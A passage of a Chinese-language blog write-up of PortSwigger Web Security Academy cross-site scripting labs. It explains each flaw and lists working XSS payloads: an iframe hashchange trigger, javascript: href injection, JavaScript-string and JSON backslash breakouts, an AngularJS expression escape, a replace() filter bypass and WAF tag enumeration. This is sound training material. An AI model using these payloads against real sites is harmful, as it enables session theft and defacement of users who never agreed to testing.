+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134522696.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134522696.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134522696.png 2x"
+    data-sizes="auto"
+    alt="image-20250306134522696"
+    title="image-20250306134522696"/></p>
+<p>它的含义是它会在浏览器的hash（URL中#后面的部分）发生变化时被触发。作用是根据URL中的hash值，在页面中查找对应的博客文章标题，并将该标题所在的位置滚动到可视区域内。如果找到匹配的元素（即 post 不为 null），则会调用 scrollIntoView() 方法，将该元素滚动到可视区域内。</p>
+<p>查看官方给出的payload，根据浏览器渲染顺序，会优先进行HTML解析，所以iframe的src属性值置为靶场URL，然后进行JS解析，触发onload事件修改src属性值，由原有URL再加上payload。</p>
+<p>在服务器修改body值并发送数据包到客户端，可以造成页面hash值变化，触发XSS攻击执行print()函数。</p>
+<p>因此onload事件修改了url值，所以会触发hashchange事件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;iframe src=&#34;https://YOUR-LAB-ID.web-security-academy.net/#&#34; onload=&#34;this.src+=&#39;&lt;img src=x onerror=print()&gt;&#39;&#34;&gt;&lt;/iframe&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用burp，或者靶场提供的工具：</p>
+<p>点击 Go to exploit server进行利用服务器，将payload放入body中。点击store进行保存，然后点击veiw exploit查看攻击效果：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135044715.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135044715.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135044715.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135044715.png 2x"
+    data-sizes="auto"
+    alt="image-20250306135044715"
+    title="image-20250306135044715"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134257696.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134257696.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134257696.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134257696.png 2x"
+    data-sizes="auto"
+    alt="image-20250306134257696"
+    title="image-20250306134257696"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135030865.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135030865.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135030865.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135030865.png 2x"
+    data-sizes="auto"
+    alt="image-20250306135030865"
+    title="image-20250306135030865"/></p>
+<p>返回漏洞利用服务器并单击 <strong>交付给受害者</strong><code>Deliver to victim</code> 以完成实验问题：</p>
+<blockquote>
+<p>看完还是有点晕乎乎的</p>
+</blockquote>
+<h3 id="7reflected-xss-into-attribute-with-angle-brackets-html-encodedhttpsportswiggernetweb-securitycross-site-scriptingcontextslab-attribute-angle-brackets-html-encoded">7.<a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into attribute with angle brackets HTML-encoded<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>尖括号编码的反射型XSS</p>
+<p>本实验包含搜索博客功能中反映的跨站点脚本漏洞，其中尖括号是HTML编码的。要解决此实验，请执行跨站点脚本攻击，注入属性并调用alert函数。</p>
+<p>随意搜索一些东西：可以看到搜索值在input的value属性里面</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135747808.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135747808.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135747808.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135747808.png 2x"
+    data-sizes="auto"
+    alt="image-20250306135747808"
+    title="image-20250306135747808"/></p>
+<p>输入一些payload：</p>
+<p>可以发现尖括号被编码了，但是<code>/</code>和引号没有被编码：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135923606.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135923606.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135923606.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135923606.png 2x"
+    data-sizes="auto"
+    alt="image-20250306135923606"
+    title="image-20250306135923606"/></p>
+<p>避免使用尖括号，闭合前面的标签：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140043110.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140043110.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140043110.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140043110.png 2x"
+    data-sizes="auto"
+    alt="image-20250306140043110"
+    title="image-20250306140043110"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141227005.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141227005.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141227005.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141227005.png 2x"
+    data-sizes="auto"
+    alt="image-20250306141227005"
+    title="image-20250306141227005"/></p>
+<h3 id="8stored-xss-into-anchor-href-attribute-with-double-quotes-html-encodedhttpsportswiggernetweb-securitycross-site-scriptingcontextslab-href-attribute-double-quotes-html-encoded">8.<a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded"target="_blank" rel="external nofollow noopener noreferrer">Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>双引号编码的href属性存储型XSS</p>
+<p>在留言板输入内容后，评论会显示留言内容，其中输入的网址会成为a标签herf属性的值，它所对应的是输入的用户名位置。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140504361.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140504361.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140504361.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140504361.png 2x"
+    data-sizes="auto"
+    alt="image-20250306140504361"
+    title="image-20250306140504361"/></p>
+<p>输入payload：看到双引号被进行html编码了</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140653270.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140653270.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140653270.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140653270.png 2x"
+    data-sizes="auto"
+    alt="image-20250306140653270"
+    title="image-20250306140653270"/></p>
+<p>修改payload为js伪协议：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">javascript:alert(1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回到留言板页面，点击用户名，触发XSS弹窗</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140913765.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140913765.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140913765.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140913765.png 2x"
+    data-sizes="auto"
+    alt="image-20250306140913765"
+    title="image-20250306140913765"/></p>
+<h3 id="9reflected-xss-into-a-javascript-string-with-angle-brackets-html-encodedhttpsportswiggernetweb-securitycross-site-scriptingcontextslab-javascript-string-angle-brackets-html-encoded">9.<a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into a JavaScript string with angle brackets HTML encoded<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></h3>
+<p>JavaScript字符串中带尖括号编码的反射型XSS</p>
+<p>搜索框输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，发现尖括号被进行了html编码。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141556803.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141556803.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141556803.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141556803.png 2x"
+    data-sizes="auto"
+    alt="image-20250306141556803"
+    title="image-20250306141556803"/></p>
+<p>不使用尖括号，闭合前后的单引号，并且构造成一个完整js语句，触发XSS弹窗。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;;alert(/xss/);&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&#39;-alert(1)-&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>![](../../../../../Library/Application Support/typora-user-images/image-20250306141640436.png)</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141702688.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141702688.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141702688.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141702688.png 2x"
+    data-sizes="auto"
+    alt="image-20250306141702688"
+    title="image-20250306141702688"/></p>
+<h3 id="10从url获取参数写到select元素内的dom型xss">10.从URL获取参数写到select元素内的DOM型XSS</h3>
+<p>DOM XSS in document.write sink using source location.search inside a select element</p>
+<p>本实验包含股票检查器功能中的一个基于DOM的跨站点脚本漏洞。它使用JavaScript document.write函数，该函数将数据写入页面。document.write函数是用来自location.search的数据调用的，您可以使用网站URL来控制这些数据。数据包含在选择元素中。
+要解决此实验，请执行跨站点脚本攻击，该攻击将突破select元素并调用alert函数。</p>
+<p>可以看到，js根据URL中的查询参数storeId来生成一个下拉选择框select元素</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143024090.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143024090.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143024090.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143024090.png 2x"
+    data-sizes="auto"
+    alt="image-20250306143024090"
+    title="image-20250306143024090"/></p>
+<p>所以在URL后面加上参数storeId，toreId的值被加入到了拉选择框。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&amp;storeId=&#34;&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143122927.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143122927.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143122927.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143122927.png 2x"
+    data-sizes="auto"
+    alt="image-20250306143122927"
+    title="image-20250306143122927"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143203105.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143203105.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143203105.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143203105.png 2x"
+    data-sizes="auto"
+    alt="image-20250306143203105"
+    title="image-20250306143203105"/></p>
+<h3 id="11angularjs中尖括号和双引号编码的dom型xss">11.AngularJS中尖括号和双引号编码的DOM型XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression"target="_blank" rel="external nofollow noopener noreferrer">DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>ng-appAngularJS 是一个流行的 JavaScript 库，它扫描包含属性（也称为 AngularJS 指令） 的 HTML 节点的内容。当指令添加到 HTML 代码中时，您可以执行双花括号内的 JavaScript 表达式。当对尖括号进行编码时，此技术非常有用。</p>
+<p>在搜索框中输入随机字母数字字符串。 查看页面源代码并观察您的随机字符串是否包含在ng-app指令中。</p>
+<p>在搜索框输入<code>add{{1+1}}</code>，看到执行了，说明双大括号内是可以执行代码表达式的。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143614793.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143614793.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143614793.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143614793.png 2x"
+    data-sizes="auto"
+    alt="image-20250306143614793"
+    title="image-20250306143614793"/></p>
+<p>在搜索框中输入以下 AngularJS 表达式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> {{$on.constructor(&#39;alert(1)&#39;)()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143518411.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143518411.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143518411.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143518411.png 2x"
+    data-sizes="auto"
+    alt="image-20250306143518411"
+    title="image-20250306143518411"/></p>
+<h3 id="12反射型-dom-xss">12.反射型 DOM XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected"target="_blank" rel="external nofollow noopener noreferrer">Reflected DOM XSS<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>查看源代码，eval函数将响应的数据拼接字符串后执行。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150304017.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150304017.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150304017.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150304017.png 2x"
+    data-sizes="auto"
+    alt="image-20250306150304017"
+    title="image-20250306150304017"/></p>
+<p>可以看到是json格式的：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150415987.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150415987.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150415987.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150415987.png 2x"
+    data-sizes="auto"
+    alt="image-20250306150415987"
+    title="image-20250306150415987"/></p>
+<p>但是会对双引号转义：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150458379.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150458379.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150458379.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150458379.png 2x"
+    data-sizes="auto"
+    alt="image-20250306150458379"
+    title="image-20250306150458379"/></p>
+<p>通过尝试不同的搜索字符串，您可以确定JSON响应正在转义引号。但是，反斜杠没有被转义。</p>
+<p>没有对<code>\</code>进行转移，在双引号前加<code>\</code>，可以使双引号转义失效，<code>\&quot;}</code>或者<strong>破坏原本json语义，使json数据提前结束。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">\</span><span class="s2">&#34;-alert(1)}//
+</span></span></span><span class="line"><span class="cl"><span class="s2">\&#34;</span><span class="p">};</span><span class="nx">alert</span><span class="p">(</span><span class="sr">/xss/</span><span class="p">);</span><span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150753275.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150753275.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150753275.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150753275.png 2x"
+    data-sizes="auto"
+    alt="image-20250306150753275"
+    title="image-20250306150753275"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150722269.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150722269.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150722269.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150722269.png 2x"
+    data-sizes="auto"
+    alt="image-20250306150722269"
+    title="image-20250306150722269"/></p>
+<p>最终eval函数的值会执行alert函数：</p>
+<p>值会变成这样：<code>var searchResultsObj = &quot;results&quot;:[],&quot;searchTerm&quot;:&quot;\\&quot;-alert(1)//&quot;}</code></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150831169.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150831169.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150831169.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150831169.png 2x"
+    data-sizes="auto"
+    alt="image-20250306150831169"
+    title="image-20250306150831169"/></p>
+<h3 id="13存储型dom-xss">13.存储型DOM XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored"target="_blank" rel="external nofollow noopener noreferrer">Stored DOM XSS<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>在留言板的评论，会过滤<code>&lt;/script&gt;</code></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222631321.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222631321.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222631321.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222631321.png 2x"
+    data-sizes="auto"
+    alt="image-20250306222631321"
+    title="image-20250306222631321"/></p>
+<p>js源码中使用replace()将尖括号换成空字符串，但是只对第一个<code>&lt;</code>和<code>&gt;</code>进行替换。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222723118.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222723118.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222723118.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222723118.png 2x"
+    data-sizes="auto"
+    alt="image-20250306222723118"
+    title="image-20250306222723118"/></p>
+<p>在xss代码前插入一组&lt;&gt;，即可绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="err">&lt;</span>&gt;<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">1</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(/xss/)</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222800907.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222800907.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222800907.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222800907.png 2x"
+    data-sizes="auto"
+    alt="image-20250306222800907"
+    title="image-20250306222800907"/></p>
+<h3 id="14大部分html标签和属性被过滤的反射型xss">14.大部分HTML标签和属性被过滤的反射型XSS</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked"target="_blank" rel="external nofollow noopener noreferrer">Reflected XSS into HTML context with most tags and attributes blocked<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>本题需要绕过WAF，大部分标签和属性被过滤了。</p>
+<p>使用burp遍历，爆破哪些标签不会被拦截：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224020461.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224020461.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224020461.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224020461.png 2x"
+    data-sizes="auto"
+    alt="image-20250306224020461"
+    title="image-20250306224020461"/></p>
+<p>这里使用burp提供的https://portswigger.net/web-security/cross-site-scripting/cheat-sheet，分别使用标签和事件替换到爆破的payload：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306223351572.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306223351572.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306223351572.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306223351572.png 2x"
+    data-sizes="auto"
+    alt="image-20250306223351572"
+    title="image-20250306223351572"/></p>
+<p>我的网的问题还是怎么回事加载不了了，就借鉴一下别人的吧（https://www.cnblogs.com/smileleooo/p/18069037#612-%E5%8F%8D%E5%B0%84%E5%9E%8B-dom-xss）</p>
+<p><strong>先枚举标签</strong>，发现body和custom tags没有被过滤：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224038293.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224038293.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224038293.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224038293.png 2x"
+    data-sizes="auto"
+    alt="image-20250306224038293"
+    title="image-20250306224038293"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224049012.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224049012.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224049012.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224049012.png 2x"
+    data-sizes="auto"
+    alt="image-20250306224049012"
+    title="image-20250306224049012"/></p>
+<p><strong>再枚举属性</strong>：在body标签里面添加变量，复制所有的event到这里</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224059435.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224059435.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224059435.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224059435.png 2x"
+    data-sizes="auto"
+    alt="image-20250306224059435"
+    title="image-20250306224059435"/></p>
+<p>发现这些属性没有被过滤：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224109258.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224109258.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224109258.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224109258.png 2x"
+    data-sizes="auto"
+    alt="image-20250306224109258"
+    title="image-20250306224109258"/></p>
+<p>利用iframe和onload属性自动触发onresize事件。</p>
+<p>在exploit server，将以下playload保存并发送给受害者。这个payload通过iframe的src属性加载网址，然后在页面加载和大小变化时执行print()。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224120897.png"
